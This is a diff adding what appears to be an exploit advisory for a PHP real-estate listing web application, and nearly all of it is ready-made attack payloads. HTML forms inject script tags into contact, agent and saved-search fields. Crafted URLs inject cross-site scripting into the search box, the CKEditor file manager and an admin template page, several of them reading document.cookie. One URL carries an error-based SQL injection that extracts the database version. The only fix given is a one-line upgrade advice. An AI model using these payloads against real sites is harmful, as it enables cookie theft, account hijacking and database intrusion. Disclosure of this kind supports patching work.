@@ -1,0 +1,50 @@
+<form action="http://www.example.com/index.php?action=contact_friend&popup=yes&listing_id=1" method="post">
+<input type="hidden" name="name" value='"><script>alert(1);</script>'>
+<input type="hidden" name="email" value='"><script>alert(2);</script>'>
+<input type="hidden" name="friend_email" value='"><script>alert(3);</script>'>
+<input type="hidden" name="subject" value='"><script>alert(4);</script>'>
+<input type="hidden" name="message" value='</textarea><script>alert(5);</script>'>
+<input type="hidden" name="submit" value='send'>
+<input name="send" value="EXPLOIT" type="submit">
+</form>
+
+
+http://www.example.com/index.php?searchtext=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+
+<form action="http://www.example.com/index.php?action=contact_agent&listing_id=1<script>alert(1);</script> " method="post">
+<input type="hidden" name="comments" value='<script>alert(2);</script>'>
+<input type="hidden" name="formaction" value='create_new_lead'>
+<input type="hidden" name="listingID" value='1'>
+<input type="hidden" name="source" value='<script>alert(3);</script>'>
+<input name="send" value="EXPLOIT" type="submit">
+</form>
+
+
+
+http://www.example.com/include/class/ckeditor/custom/filemanager/connectors/php/filemanager.php?mode=getfolder&path=%3Cimg%20src=%221%22%20onerror=javascript:alert%28document.cookie%29;%3E
+
+
+
+
+
+http://www.example.com/admin/index.php?action=edit_user_template&type=1%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+
+
+<form action="http://www.example.com/index.php?action=save_search&printer_friendly= " method="post">
+<input type="hidden" name="notify" value='no'>
+<input type="hidden" name="title" value=''>
+<input type="hidden" name="query" value='"><script>alert(document.cookie);</script>'>
+<input name="send" value="EXPLOIT" type="submit">
+</form>
+
+
+
+http://www.example.com/admin/index.php?action=edit_user_template&type=min%28@a:=1%29from%20%28select%201%20union%20select%202%29k%20group%20by%20%28select%20concat%28@@version,0x0,@a:=%28@a%2B1%29%2%29%29%20--%202
+
+
+Solution: Upgrade to the most recent version
+
